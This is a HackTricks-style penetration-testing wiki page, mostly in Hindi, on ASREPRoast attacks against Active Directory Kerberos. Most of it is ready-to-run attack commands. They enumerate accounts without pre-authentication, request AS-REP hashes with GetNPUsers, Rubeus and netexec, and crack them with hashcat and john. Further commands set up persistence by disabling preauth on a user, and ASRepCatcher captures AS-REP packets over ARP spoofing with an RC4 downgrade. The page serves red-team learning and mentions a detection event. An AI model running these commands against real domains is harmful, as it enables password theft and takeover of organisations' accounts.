# ASREPRoast

{{#include ../../banners/hacktricks-training.md}}

## ASREPRoast

ASREPRoast एक सुरक्षा हमला है जो उन उपयोगकर्ताओं का शोषण करता है जिनके पास **Kerberos pre-authentication required attribute** नहीं होता। मूलतः, यह कमजोरी attackers को Domain Controller (DC) से किसी user के लिए authentication अनुरोध करने की अनुमति देती है बिना user के password की ज़रूरत के। DC तब user के पासवर्ड-से-व्युत्पन्न कुंजी से एन्क्रिप्टेड संदेश के साथ प्रतिक्रिया करता है, जिसे attackers ऑफ़लाइन क्रैक करके user का पासवर्ड खोजने का प्रयास कर सकते हैं।

इस हमले की मुख्य आवश्यकताएँ हैं:

- **Lack of Kerberos pre-authentication**: लक्षित उपयोगकर्ताओं पर यह सुरक्षा सुविधा सक्षम नहीं होनी चाहिए।
- **Connection to the Domain Controller (DC)**: Attackers को DC तक पहुँच की ज़रूरत होती है ताकि वे अनुरोध भेज सकें और एन्क्रिप्टेड संदेश प्राप्त कर सकें।
- **Optional domain account**: डोमेन खाता होने से attackers को LDAP queries के माध्यम से कमजोर उपयोगकर्ताओं की पहचान अधिक कुशलता से करने में मदद मिलती है। ऐसे खाते के बिना attackers को usernames का अनुमान लगाना होगा।

#### कमजोर उपयोगकर्ताओं का पता लगाना (डोमेन क्रेडेंशियल्स की आवश्यकता)
```bash:Using Windows
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```
#### AS_REP संदेश का अनुरोध
```bash:Using Linux
#Try all the usernames in usernames.txt
python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
#Use domain creds to extract targets and target them
python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
```

```bash:Using Windows
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```
> [!WARNING]
> AS-REP Roasting with Rubeus एक 4768 उत्पन्न करेगा, जिसका encryption type 0x17 और preauth type 0 होगा।

#### त्वरित एक-पंक्ति कमांड (Linux)

- पहले संभावित लक्ष्यों को सूचीबद्ध करें (e.g., from leaked build paths) Kerberos userenum के साथ: `kerbrute userenum users.txt -d domain --dc dc.domain`
- `netexec ldap <dc> -u svc_scan -p '' --asreproast out.asreproast` का उपयोग करके एक एकल उपयोगकर्ता का AS-REP प्राप्त करें, यहाँ तक कि **blank** password के साथ (netexec LDAP signing/channel binding posture भी प्रिंट करता है)।
- `hashcat out.asreproast /path/rockyou.txt` के साथ क्रैक करें — यह AS-REP roast hashes के लिए स्वतः **-m 18200** (etype 23) पहचान लेता है।

### Cracking
```bash
john --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt
```
### Persistence

उस उपयोगकर्ता के लिए Force **preauth** को 'not required' बनाएं जहाँ आपके पास **GenericAll** permissions (या properties लिखने की permissions) हों:
```bash:Using Windows
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH 'target_user'
```
## ASREProast बिना क्रेडेंशियल्स

एक हमलावर man-in-the-middle स्थिति का उपयोग करके नेटवर्क पर चलते समय AS-REP पैकेट्स को कैप्चर कर सकता है, बिना इस बात पर निर्भर किए कि Kerberos pre-authentication disabled है। इसलिए यह VLAN पर सभी उपयोगकर्ताओं के लिए काम करता है.\
[ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) हमें ऐसा करने की अनुमति देता है। इसके अलावा, यह टूल Kerberos negotiation को बदलकर client workstations को RC4 का उपयोग करने के लिए मजबूर करता है।
```bash
# Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
ASRepCatcher relay -dc $DC_IP

# Disabling ARP spoofing, the mitm position must be obtained differently
ASRepCatcher relay -dc $DC_IP --disable-spoofing

# Passive listening of AS-REP packets, no packet alteration
ASRepCatcher listen
```
## संदर्भ

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)
- [0xdf – HTB Bruno (AS-REP roast → ZipSlip → DLL hijack)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)

---

{{#include ../../banners/hacktricks-training.md}}
